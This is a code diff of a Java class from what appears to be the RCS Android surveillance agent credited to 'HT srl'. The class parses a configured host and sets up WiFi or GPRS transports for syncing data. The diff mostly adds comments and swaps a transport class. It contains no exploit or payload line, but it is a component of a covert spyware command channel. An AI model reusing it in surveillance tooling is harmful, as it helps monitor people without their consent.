@@ -1,28 +1,53 @@
+/* *******************************************
+ * Copyright (c) 2011
+ * HT srl,   All rights reserved.
+ * Project      : RCS, RCSAndroid
+ * File         : SyncActionInternet.java
+ * Created      : Apr 9, 2011
+ * Author		: zeno
+ * *******************************************/
 package com.ht.RCSAndroidGUI.action;
 
 import java.io.IOException;
-import java.util.Vector;
 
-import com.ht.RCSAndroidGUI.action.sync.DirectTransport;
-import com.ht.RCSAndroidGUI.action.sync.Protocol;
+import com.ht.RCSAndroidGUI.action.sync.GprsTransport;
 import com.ht.RCSAndroidGUI.action.sync.WifiTransport;
 import com.ht.RCSAndroidGUI.utils.DataBuffer;
 import com.ht.RCSAndroidGUI.utils.WChar;
 
+// TODO: Auto-generated Javadoc
+/**
+ * The Class SyncActionInternet.
+ */
 public class SyncActionInternet extends SyncAction {
 
+	/** The wifi forced. */
 	protected boolean wifiForced;
 
+	/** The wifi. */
 	protected boolean wifi;
+	
+	/** The gprs. */
 	protected boolean gprs;
+	
+	/** The host. */
 	String host;
 
-	public SyncActionInternet(int type, byte[] confParams) {
+	/**
+	 * Instantiates a new sync action internet.
+	 *
+	 * @param type the type
+	 * @param confParams the conf params
+	 */
+	public SyncActionInternet(final int type, final byte[] confParams) {
 		super(type, confParams);
 	}
 
+	/* (non-Javadoc)
+	 * @see com.ht.RCSAndroidGUI.action.SyncAction#parse(byte[])
+	 */
 	@Override
-	protected boolean parse(byte[] confParams) {
+	protected boolean parse(final byte[] confParams) {
 		final DataBuffer databuffer = new DataBuffer(confParams, 0,
 				confParams.length);
 
@@ -32,7 +57,7 @@ public class SyncActionInternet extends SyncAction {
 
 			final int len = databuffer.readInt();
 			final byte[] buffer = new byte[len];
-			databuffer.readFully(buffer);
+			databuffer.read(buffer);
 
 			host = WChar.getString(buffer, true);
 
@@ -55,6 +80,9 @@ public class SyncActionInternet extends SyncAction {
 		return true;
 	}
 
+	/* (non-Javadoc)
+	 * @see com.ht.RCSAndroidGUI.action.SyncAction#initTransport()
+	 */
 	@Override
 	protected boolean initTransport() {
 		if (wifi) {
@@ -68,11 +96,10 @@ public class SyncActionInternet extends SyncAction {
 			// #ifdef DEBUG
 			debug.trace("initTransport adding DirectTransport");
 			// #endif
-			transports.addElement(new DirectTransport(host));
+			transports.addElement(new GprsTransport(host));
 		}
 
 		return true;
 	}
-
 
 }
